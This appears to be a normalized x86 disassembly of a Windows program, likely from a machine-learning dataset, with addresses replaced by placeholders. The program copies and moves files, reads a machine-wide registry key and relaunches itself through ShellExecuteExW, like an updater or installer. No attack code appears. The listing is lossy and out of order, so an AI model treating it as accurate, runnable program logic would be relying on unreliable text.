jmp r-xdata
mov edx [ rw-data ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push rw-data
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
movzx eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_412ffa
add esp 0x4
test eax eax
je r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push r--data
push 0x104
lea edx [ ebp - 0xa78 ]
push edx
call sub_401540
add esp 0x10
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
push rw-data
call [ GetLongPathNameW@IAT ]
test eax eax
jne r-xdata
push rw-data
call sub_411794
add esp 0x4
lea ecx [ eax + eax + 0x4 ]
push ecx
call sub_412584
add esp 0x4
mov [ ebp - 0x1114 ] eax
cmp [ ebp - 0x1114 ] 0x0
jne r-xdata
push rw-data
call sub_412153
add esp 0x4
mov [ ebp - 0x1110 ] eax
cmp [ ebp - 0x1110 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0xa78 ]
push ecx
call sub_401540
add esp 0x10
lea ecx [ ebp - 0xc80 ]
push ecx
call sub_4066c0
add esp 0x4
movzx edx al
test edx edx
jne r-xdata
push 0x0
lea edx [ ebp - 0xa78 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x428 ] 0xffffffff
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
push rw-data
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
call sub_401190
mov ecx eax
call sub_408440
push 0x7
call sub_4048d0
add esp 0x4
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x1114 ]
mov [ ebp - 0x1118 ] edx
push rw-data
mov eax [ ebp - 0x1118 ]
push eax
call sub_412d52
add esp 0x8
push rw-data
call sub_411794
add esp 0x4
mov ecx [ ebp - 0x1118 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x1118 ] edx
push rw-data
call sub_411794
add esp 0x4
movzx eax [ eax * 2 + rw-data ]
cmp eax 0x2f
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
call sub_4119bb
cmp [ eax ] 0x11
je r-xdata
push 0x0
push 0x4000000
push 0x4
push 0x0
push 0x0
push 0xc0000000
lea eax [ ebp - 0xa78 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x420 ] eax
mov ecx [ rw-data ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x418 ]
push edx
call sub_401540
add esp 0x10
lea eax [ ebp - 0x418 ]
push eax
call [ GetFileAttributesW@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov [ ebp - 0x869 ] cl
movzx edx [ ebp - 0x869 ]
test edx edx
je r-xdata
lea eax [ ebp - 0xa78 ]
push eax
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
push 0x5c
lea eax [ ebp - 0xc80 ]
push eax
call sub_404520
add esp 0x8
mov [ ebp - 0xc84 ] eax
xor ecx ecx
mov edx [ ebp - 0xc84 ]
mov [ edx ] cx
lea eax [ ebp - 0xc80 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0xa78 ]
push ecx
call sub_401540
add esp 0x10
jmp r-xdata
mov eax 0x1
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
jne r-xdata
push 0x208
push 0x0
lea ecx [ ebp - 0x1320 ]
push ecx
call sub_412f80
add esp 0xc
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x173c ] eax
xor ecx ecx
mov [ ebp - 0x1738 ] cx
push 0x40e
push 0x0
lea edx [ ebp - 0x1736 ]
push edx
call sub_412f80
add esp 0xc
mov [ ebp - 0x1324 ] 0x208
movzx eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x418 ]
push eax
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp - 0x420 ]
push edx
call [ CloseHandle@IAT ]
xor eax eax
mov ecx [ ebp - 0x1118 ]
mov [ ecx ] ax
mov edx [ ebp - 0x1118 ]
add edx 0x2
mov [ ebp - 0x1118 ] edx
mov eax [ ebp - 0x1114 ]
mov [ rw-data ] eax
push rw-data
call sub_411794
add esp 0x4
movzx ecx [ eax * 2 + rw-data ]
cmp ecx 0x5c
je r-xdata
push rw-data
call sub_412ffa
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
push 0x0
call sub_409aa0
add esp 0x4
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
push 0x0
push sub_404ae0
lea ecx [ ebp - 0x440 ]
call sub_404540
test eax eax
jne r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
push 0x104
lea ecx [ ebp - 0x1320 ]
push ecx
mov edx [ ebp - 0x173c ]
push edx
call [ GetLongPathNameW@IAT ]
test eax eax
jne r-xdata
push 0x0
push rw-data
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
push edx
call [ PathCommonPrefixW@IAT ]
mov [ ebp - 0x1950 ] eax
lea eax [ ebp - 0x1738 ]
mov [ ebp - 0x1740 ] eax
mov ecx [ ebp - 0x1950 ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push eax
mov ecx [ ebp - 0x1740 ]
push ecx
call sub_4134a9
add esp 0xc
mov edx [ ebp - 0x1950 ]
mov eax [ ebp - 0x1740 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x1740 ] ecx
mov edx [ ebp - 0x1324 ]
sub edx [ ebp - 0x1950 ]
mov [ ebp - 0x1324 ] edx
mov eax [ ebp - 0x1324 ]
push eax
mov ecx [ ebp - 0x1950 ]
lea edx [ ecx * 2 + rw-data ]
push edx
mov eax [ ebp - 0x1740 ]
push eax
call sub_4134a9
add esp 0xc
mov ecx [ ebp - 0x1950 ]
lea edx [ ecx * 2 + rw-data ]
push edx
call sub_411794
add esp 0x4
mov [ ebp - 0x1954 ] eax
mov eax [ ebp - 0x1954 ]
mov ecx [ ebp - 0x1740 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x1740 ] edx
mov eax [ ebp - 0x1324 ]
sub eax [ ebp - 0x1954 ]
mov [ ebp - 0x1324 ] eax
mov ecx 0x5c
mov edx [ ebp - 0x1740 ]
mov [ edx ] cx
mov eax [ ebp - 0x1740 ]
add eax 0x2
mov [ ebp - 0x1740 ] eax
mov ecx [ ebp - 0x1324 ]
sub ecx 0x1
mov [ ebp - 0x1324 ] ecx
xor edx edx
mov eax [ ebp - 0x1740 ]
mov [ eax ] dx
lea ecx [ ebp - 0x1948 ]
push ecx
call sub_4066c0
add esp 0x4
movzx edx al
test edx edx
jne r-xdata
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
lea ecx [ ebp - 0x418 ]
push ecx
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
push r--data
mov edx [ ebp - 0x1118 ]
push edx
call sub_412d24
add esp 0x8
push r--data
call sub_411794
add esp 0x4
mov ecx [ ebp - 0x1118 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x1118 ] edx
jmp r-xdata
mov eax 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x418 ]
push eax
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
movzx eax [ ebp - 0x41a ]
test eax eax
je r-xdata
push r--data
call sub_4047e0
add esp 0x4
movzx edx [ rw-data ]
test edx edx
je r-xdata
lea ecx [ ebp - 0x440 ]
call sub_404590
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
movzx edx [ rw-data ]
test edx edx
jne r-xdata
push 0x0
push r--data
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
movzx eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x173c ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
call sub_401190
mov ecx eax
call sub_408440
push 0x7
call sub_4048d0
add esp 0x4
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
push 0x0
lea eax [ ebp - 0x1948 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
push edx
call [ PathCommonPrefixW@IAT ]
mov [ ebp - 0x194c ] eax
mov eax [ ebp - 0x194c ]
cmp eax [ ebp - 0x1950 ]
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
movzx edx [ rw-data ]
push edx
mov eax [ ebp + 0xc ]
add eax 0x14
push eax
mov ecx [ ebp + 0x8 ]
sub ecx 0x5
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x10 ]
push eax
call sub_404770
add esp 0x10
mov eax 0x1
jmp r-xdata
push 0x0
push 0x4000000
push 0x4
push 0x0
push 0x0
push 0xc0000000
lea edx [ ebp - 0x418 ]
push edx
call [ CreateFileW@IAT ]
mov [ ebp - 0xe94 ] eax
cmp [ ebp - 0xe94 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x418 ]
push ecx
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
movzx ecx [ ebp - 0x431 ]
test ecx ecx
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax 0x1
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
jne r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
movzx eax [ rw-data ]
test eax eax
jne r-xdata
push r--data
call sub_412153
add esp 0x4
lea ecx [ ebp - 0x210 ]
push ecx
call sub_411794
add esp 0x4
mov [ ebp - 0x1964 ] eax
lea edx [ ebp - 0x1320 ]
mov [ ebp - 0x195c ] edx
mov [ ebp - 0x196c ] rw-data
mov eax [ ebp - 0x1964 ]
mov ecx [ ebp - 0x195c ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x195c ] edx
mov eax [ ebp - 0x195c ]
movzx ecx [ eax ]
cmp ecx 0x5c
jne r-xdata
push 0x0
lea edx [ ebp - 0x418 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x420 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x1950 ]
mov [ ebp - 0x1b80 ] edx
mov ecx [ ebp - 0x194c ]
mov [ ebp - 0x1b80 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax 0x4
push eax
mov ecx [ ebp + 0x8 ]
sub ecx 0x1
push ecx
call sub_402b40
add esp 0x8
mov [ ebp - 0xe98 ] eax
cmp [ ebp - 0xe98 ] 0x0
jne r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax 0x1
jmp r-xdata
push r--data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov eax 0x1
jmp r-xdata
movzx edx [ ebp - 0x419 ]
test edx edx
je r-xdata
call sub_401190
mov ecx eax
call sub_408440
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x428 ]
push edx
call [ CloseHandle@IAT ]
push rw-data
call sub_4120b4
add esp 0x4
push 0x1
push 0x0
call sub_407b10
add esp 0x8
mov eax [ ebp - 0x195c ]
movzx ecx [ eax ]
cmp ecx 0x5c
jne r-xdata
mov edx [ ebp - 0x195c ]
add edx 0x2
mov [ ebp - 0x195c ] edx
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
lea eax [ ebp - 0x418 ]
push eax
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp - 0x1324 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0x1b80 ]
lea ecx [ edx + eax * 2 ]
push ecx
mov edx [ ebp - 0x1740 ]
push edx
call sub_4134a9
add esp 0xc
lea eax [ ebp - 0x1738 ]
mov [ ebp - 0x173c ] eax
lea eax [ ebp - 0xe90 ]
push eax
call sub_4066c0
add esp 0x4
movzx ecx al
test ecx ecx
jne r-xdata
mov edx [ ebp - 0xe94 ]
push edx
call [ CloseHandle@IAT ]
mov eax 0x1
jmp r-xdata
movzx eax [ rw-data ]
neg eax
sbb eax eax
add eax 0x1
movzx eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call sub_412185
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x196c ]
mov edx [ ebp - 0x195c ]
mov ax [ edx ]
mov [ ecx ] ax
mov edx 0x2f
mov eax [ ebp - 0x196c ]
mov [ eax ] dx
jmp r-xdata
mov eax 0x1
jmp r-xdata
movzx ecx [ rw-data ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x14
push edx
mov eax [ ebp + 0x8 ]
sub eax 0x5
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
push edx
call sub_404770
add esp 0x10
mov eax 0x1
jmp r-xdata
movzx edx [ ebp - 0x41a ]
test edx edx
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
call sub_4119bb
mov edx [ eax ]
push edx
push r--data
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
push 0x4
push 0x0
push r--data
call [ MoveFileExW@IAT ]
test eax eax
je r-xdata
xor edx edx
mov eax [ ebp - 0x196c ]
mov [ eax ] dx
mov ecx [ ebp - 0x196c ]
add ecx 0x2
mov [ ebp - 0x196c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push eax
push r--data
push 0x104
push rw-data
call sub_401540
add esp 0x10
push rw-data
call sub_4120b4
add esp 0x4
push 0x0
push rw-data
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x14 ]
push edx
call [ CopyFileW@IAT ]
mov [ ebp - 0x1960 ] 0xa
mov [ ebp - 0x1968 ] 0x1
mov [ ebp - 0x1958 ] 0x0
mov ecx [ ebp - 0x195c ]
add ecx 0x2
mov [ ebp - 0x195c ] ecx
mov edx [ ebp - 0x196c ]
add edx 0x2
mov [ ebp - 0x196c ] edx
mov eax [ ebp - 0x195c ]
movzx ecx [ eax ]
test ecx ecx
jne r-xdata
movzx ecx [ ebp - 0x41a ]
test ecx ecx
je r-xdata
mov [ ebp - 0xe9c ] 0x0
lea eax [ ebp - 0xe9c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
call sub_409740
add esp 0x8
test eax eax
je r-xdata
push 0x0
lea edx [ ebp - 0x418 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x420 ]
push ecx
call [ CloseHandle@IAT ]
lea edx [ ebp - 0x1b78 ]
push edx
call sub_4066c0
add esp 0x4
movzx eax al
test eax eax
je r-xdata
push r--data
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push r--data
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1958 ] eax
mov ecx [ ebp - 0x1958 ]
push ecx
mov edx [ ebp - 0x173c ]
push edx
mov eax [ ebp - 0x1968 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
push 0x64
call [ Sleep@IAT ]
mov ecx [ ebp - 0x1968 ]
add ecx 0x1
mov [ ebp - 0x1968 ] ecx
cmp [ ebp - 0x1968 ] 0xa
jle r-xdata
jmp r-xdata
movzx ecx [ ebp - 0x41a ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0xea0 ]
push edx
call sub_4097e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x1b7c ] 0x0
cmp [ ebp - 0xe9c ] 0x0
je r-xdata
movzx ecx [ rw-data ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x14
push edx
mov eax [ ebp + 0x8 ]
sub eax 0x5
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
push edx
call sub_404770
add esp 0x10
lea eax [ ebp - 0x418 ]
push eax
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
push 0x0
push 0x0
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0x1b78 ]
push edx
call sub_408af0
add esp 0x10
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x6
push 0x40010000
mov eax [ ebp - 0x173c ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x428 ] eax
cmp [ ebp - 0x428 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x428 ] 0xffffffff
jne r-xdata
movzx eax [ ebp - 0x41a ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10b0 ]
push edx
lea eax [ ebp - 0xe90 ]
push eax
call sub_409ac0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0xea0 ] 0x0
sete al
mov [ ebp - 0x41a ] al
mov [ ebp - 0x1b7c ] 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x1b78 ]
push eax
call sub_408f60
add esp 0x4
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
call sub_401190
mov ecx eax
call sub_408440
cmp [ ebp - 0x1958 ] 0x5
jne r-xdata
movzx ecx [ ebp - 0x41a ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409200
add esp 0x8
mov [ ebp - 0x10b8 ] eax
xor eax eax
cmp [ ebp - 0x10b8 ] 0x0
sete al
mov [ ebp - 0x41a ] al
movzx ecx [ ebp - 0x41a ]
test ecx ecx
je r-xdata
mov [ ebp - 0x41a ] 0x0
mov [ ebp - 0x448 ] 0x65
lea ecx [ ebp - 0x10b4 ]
push ecx
push 0x20119
push 0x0
lea edx [ ebp - 0x10b0 ]
push edx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov al [ ebp - 0x1b7c ]
mov [ ebp - 0x41a ] al
cmp [ ebp - 0x1958 ] 0x20
jne r-xdata
push 0x23
call sub_4048d0
add esp 0x4
jmp r-xdata
movzx edx [ ebp - 0x41a ]
test edx edx
je r-xdata
movzx edx [ rw-data ]
test edx edx
je r-xdata
mov [ ebp - 0x448 ] 0x68
mov [ ebp - 0x10b9 ] 0x0
movzx edx [ rw-data ]
test edx edx
jne r-xdata
mov cl [ ebp - 0x431 ]
mov [ ebp - 0x41a ] cl
movzx edx [ ebp - 0x41a ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x10b4 ]
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0x25
call sub_4048d0
add esp 0x4
push 0x24
call sub_4048d0
add esp 0x4
jmp r-xdata
push rw-data
call sub_4120b4
add esp 0x4
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
movzx eax [ ebp - 0x41a ]
test eax eax
jne r-xdata
movzx eax [ rw-data ]
test eax eax
jne r-xdata
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
push 0x5
push r--data
call sub_409400
add esp 0x8
mov [ ebp - 0x10c0 ] eax
cmp [ ebp - 0x10c0 ] 0x1
je r-xdata
call sub_407a20
neg eax
sbb eax eax
add eax 0x1
mov [ ebp - 0x10b9 ] al
jmp r-xdata
mov [ ebp - 0x448 ] 0x66
push 0x0
lea edx [ ebp - 0x418 ]
push edx
call sub_411f69
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x420 ]
push ecx
call [ CloseHandle@IAT ]
cmp [ ebp + 0x8 ] 0x5
jle r-xdata
movzx ecx [ ebp - 0x419 ]
test ecx ecx
jne r-xdata
mov [ ebp - 0x10cd ] 0x0
lea ecx [ ebp - 0x10cd ]
push ecx
call sub_404990
add esp 0x4
movzx edx al
test edx edx
je r-xdata
mov ecx [ rw-data ]
push ecx
call sub_4092f0
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x420 ]
push eax
call [ CloseHandle@IAT ]
push 0x1
push r--data
call sub_409400
add esp 0x8
mov [ ebp - 0x10c0 ] eax
cmp [ ebp - 0x10c0 ] 0x1
je r-xdata
push 0x0
push sub_404ab0
lea ecx [ ebp - 0x10cc ]
call sub_404540
test eax eax
jne r-xdata
movzx ecx [ rw-data ]
push ecx
mov edx [ ebp + 0xc ]
add edx 0x14
push edx
mov eax [ ebp + 0x8 ]
sub eax 0x5
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x10 ]
push edx
call sub_404770
add esp 0x10
mov eax 0x1
jmp r-xdata
lea eax [ ebp - 0x418 ]
push eax
call sub_4120b4
add esp 0x4
test eax eax
je r-xdata
mov edx [ ebp - 0xe94 ]
push edx
call [ CloseHandle@IAT ]
movzx eax [ ebp - 0x41a ]
test eax eax
jne r-xdata
movzx eax [ rw-data ]
push eax
mov ecx [ ebp + 0xc ]
add ecx 0x14
push ecx
mov edx [ ebp + 0x8 ]
sub edx 0x5
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_404770
add esp 0x10
cmp [ ebp - 0x420 ] 0xffffffff
jne r-xdata
movzx eax [ ebp - 0x10cd ]
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x448 ] 0x67
mov [ ebp - 0x41a ] 0x0
lea ecx [ ebp - 0x10cc ]
call sub_404590
movzx eax [ ebp - 0x10b9 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
movzx edx [ ebp - 0x41a ]
test edx edx
je r-xdata
movzx ecx [ ebp - 0x419 ]
test ecx ecx
jne r-xdata
push 0x3c
push 0x0
lea edx [ ebp - 0x110c ]
push edx
call sub_412f80
add esp 0xc
mov [ ebp - 0x110c ] 0x3c
mov [ ebp - 0x1108 ] 0x540
mov [ ebp - 0x1104 ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10fc ] ecx
mov edx [ ebp - 0xe98 ]
mov [ ebp - 0x10f8 ] edx
mov [ ebp - 0x1100 ] r--data
mov [ ebp - 0x10f0 ] 0x1
lea eax [ ebp - 0x110c ]
push eax
call [ ShellExecuteExW@IAT ]
test eax eax
setne cl
mov [ ebp - 0x10ce ] cl
mov edx [ ebp - 0xe98 ]
push edx
call sub_4121b5
add esp 0x4
movzx eax [ ebp - 0x10ce ]
test eax eax
je r-xdata
push 0x0
push 0x0
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0xe90 ]
push edx
call sub_408af0
add esp 0x10
test eax eax
jne r-xdata
push 0x0
push 0x1
call sub_407b10
add esp 0x8
mov ecx [ ebp - 0x420 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x448 ]
push edx
call sub_4048d0
add esp 0x4
xor eax eax
jmp r-xdata
cmp [ ebp - 0x420 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x420 ] 0xffffffff
jne r-xdata
push 0x9
call sub_4048d0
add esp 0x4
push 0xffffffff
mov ecx [ ebp - 0x10d4 ]
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebp - 0x10d4 ]
push edx
call [ CloseHandle@IAT ]
jmp r-xdata
push r--data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x420 ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
sub_404540
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov edx [ ebp - 0x8 ]
push edx
push sub_4045c0
push 0x0
push 0x0
call sub_4138fc
add esp 0x18
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
neg eax
sbb eax eax
neg eax
sub eax 0x1
mov esp ebp
pop ebp
retn 0x8
sub_404590
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
mov esp ebp
pop ebp
retn
sub_4045c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x4
xor eax eax
mov esp ebp
pop ebp
retn 0x4
sub_4045f0
push ebp
mov ebp esp
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_411b05
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
movzx edx [ ebp - 0x2a ]
and edx 0xf000
cmp edx 0x4000
je r-xdata
mov eax [ ebp - 0x34 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4081c0
add esp 0x4
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4016f0
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x40 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x3c ]
push edx
call sub_408270
add esp 0x4
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
call sub_4119bb
mov edx [ eax ]
push edx
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov eax [ ebp - 0x34 ]
jmp r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_408200
add esp 0x4
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
push r--data
mov eax [ ebp - 0x38 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0x8 ]
push ecx
call sub_401740
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_412185
add esp 0x4
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
jmp r-xdata
push r--data
mov ecx [ ebp - 0x38 ]
push ecx
call sub_412c84
add esp 0x8
test eax eax
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x14
mov edx [ ebp - 0x38 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x248 ]
push ecx
call sub_401540
add esp 0x14
lea edx [ ebp - 0x248 ]
push edx
call sub_4045f0
add esp 0x4
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
je r-xdata
jmp r-xdata
sub_404770
push ebp
mov ebp esp
push r--data
call sub_41335a
add esp 0x4
push r--data
call sub_41335a
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_412ffa
add esp 0x4
test eax eax
je r-xdata
movzx ecx [ ebp + 0x14 ]
test ecx ecx
jne r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
pop ebp
retn
push 0x0
push 0x0
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
push edx
call sub_402e00
add esp 0x14
sub_4047e0
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
push eax
push r--data
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
call sub_401540
add esp 0x10
lea edx [ ebp - 0x210 ]
push edx
call sub_401760
add esp 0x4
test eax eax
je r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call sub_412b5e
add esp 0x8
push eax
lea ecx [ ebp - 0x4 ]
call sub_402750
lea ecx [ ebp - 0x4 ]
call sub_4027d0
test eax eax
jne r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x4 ]
call sub_4027d0
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412e40
add esp 0x4
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_413b0e
add esp 0x10
cmp eax 0x1
je r-xdata
mov [ ebp - 0x211 ] 0x0
lea ecx [ ebp - 0x4 ]
call sub_402770
mov al [ ebp - 0x211 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov [ ebp - 0x213 ] 0x1
lea ecx [ ebp - 0x4 ]
call sub_402770
mov al [ ebp - 0x213 ]
mov [ ebp - 0x212 ] 0x0
lea ecx [ ebp - 0x4 ]
call sub_402770
mov al [ ebp - 0x212 ]
jmp r-xdata
sub_4048d0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
